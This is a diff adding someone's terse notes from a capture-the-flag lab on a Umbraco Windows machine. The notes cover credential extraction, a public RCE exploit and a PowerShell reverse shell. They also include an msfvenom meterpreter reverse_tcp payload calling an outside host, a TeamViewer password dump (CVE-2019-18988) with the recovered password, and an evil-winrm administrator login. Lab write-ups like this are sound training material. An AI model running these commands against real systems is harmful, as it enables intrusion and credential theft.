@@ -21,4 +21,41 @@ google about Umbraco and how it stores data, backups and configurations
 found creds in App_Data/Umbraco.sdf using strings Umbraco.sdf | head command
 creads are in SHA1, so i need to use a sha1 killer
 
+after login in the umbraco page, found the umbraco current version
+Found on google a rce exploit. now i need a command to spaw a low priv shell with powershell reverse shell
 
+
+used the third option on PayloadAllTheThings powershell reverse shell
+i needed to open an nc connection for the reverse shell and a webserver to download the reverse script
+
+python3 -m http.server
+nc -lvp 4444
+exploit - umbraco(github)
+
+"(wmic os get OSArchitecture)"
+the machine is 64bit
+
+user.txt in Public Folder (dumbass!!!!!!)
+
+cve-2019-18988
+found Polish tutorial using meterpreter.
+need a shell using msfvenon to get meterpreter shell
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.142 LPORT=4466 -f exe > shell.exe
+
+with the meterpreter session open:
+execute -f cmd.exe -i -H
+
+now, i have a shell :D
+
+
+run post/windows/gather/credentials/teamviewer_passwords
+
+!R3m0te!
+
+
+sudo evil-winrm -u administrator -p '!R3m0te!' -i 10.10.10.180
+
+
+root
